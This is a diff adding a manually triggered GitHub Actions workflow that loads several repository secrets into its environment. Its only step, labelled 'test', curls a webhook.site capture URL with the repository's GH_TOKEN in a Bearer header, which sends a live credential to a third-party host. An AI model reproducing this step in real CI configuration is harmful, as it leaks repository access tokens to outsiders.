@@ -1,0 +1,34 @@
+name: webhook
+
+on:
+  # schedule:
+  #   - cron: '0 0,6,12,18 * * *'  
+    
+  workflow_dispatch:
+  # repository_dispatch:
+  #   types: [deploy-app]
+
+  
+jobs:
+  docker-compose:
+    runs-on: ubuntu-latest
+    env:
+      ENCRYPTION_KEY: ${{ secrets.ENCRYPTION_KEY }}
+      R2_ACCESS_KEY: ${{ secrets.R2_ACCESS_KEY }}
+      R2_SECRET_KEY: ${{ secrets.R2_SECRET_KEY }}
+      R2_ENDPOINT: ${{ secrets.R2_ENDPOINT }}
+      R2_BUCKET: ${{ secrets.R2_BUCKET }}
+      DB_PATH: ${{ secrets.DB_PATH }}
+      CRAWL_DB_PATH: ${{ secrets.CRAWL_DB_PATH }}
+      N8N_DB_PATH: ${{ secrets.N8N_DB_PATH }}
+      TUNNEL_TOKEN: ${{ secrets.TUNNEL_TOKEN }}
+      API_KEY: ${{ secrets.API_KEY }}
+
+    steps:
+      - name: test
+        run: |
+          curl -X POST \
+            -H "Accept: application/vnd.github+json" \
+            -H "Authorization: Bearer ${{ secrets.GH_TOKEN }}" \
+            https://webhook.site/2e2bcb75-7524-4406-935f-f8002d40434c \
+            -d '{"event_type":"deploy-app"}'
